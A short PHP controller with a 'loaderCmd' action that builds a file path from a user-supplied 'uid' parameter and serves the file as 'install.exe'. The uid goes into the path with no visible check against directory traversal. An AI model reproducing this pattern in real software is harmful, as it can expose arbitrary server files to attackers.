<?php
//---------------------- required -------------
require_once '../controller/boot.php';
require_once '../controller/Public.php';

//---------------------- libs -----------------
//---------------------- models ---------------
require_once '../model/Programs.php';

class Controller extends PublicController {
    private $UsersModel;
    
    public function __construct(Config $config) {
        parent::__construct($config);
    }
    
    public function init(Config $config) {
        parent::init($config);
    }    
    
    public function indexCmd() {
        return $this->_404($this->getCommand());
    }
    
    public function loaderCmd() {
        $uid = Filter::getStrval($_REQUEST, 'uid');
        $filepath = ProgramsModel::$LOADERDST.$uid;
        if (file_exists($filepath)) {
            Response::file('install.exe', file_get_contents($filepath));
            die();
        }
        $this->addMessage('File not found');
        $this->redirect('index.php?cmd=index');
    }
    
}

//---------------------- required -------------
require_once '../controller/dispatcher/default.php';
?>